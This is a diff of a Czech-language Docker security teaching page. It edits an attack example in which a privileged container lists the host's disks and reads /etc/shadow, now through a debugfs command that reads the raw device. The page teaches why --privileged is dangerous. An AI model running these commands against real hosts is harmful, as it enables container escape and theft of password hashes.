@@ -271,8 +271,8 @@ docker volume rm app-data</pre>
         <h3>Útok — mount disku hostitele</h3>
         <pre><span class="o">docker run --privileged</span> alpine
 fdisk -l            <span class="c"># vidí disky hostitele</span>
-mount -o ro /dev/sda1 /mnt
-cat /mnt/etc/shadow</pre>
+<span class="c"># čte disk přímo, read-only, bez mountu:</span>
+debugfs -R "cat /etc/shadow" /dev/sda1</pre>
         <p style="margin-top:10px"><code class="inline">--privileged</code> = všechny capabilities + všechna <code class="inline">/dev</code> + vypnuté profily → <b>root na hostiteli</b>.</p>
       </div>
       <div class="card good">
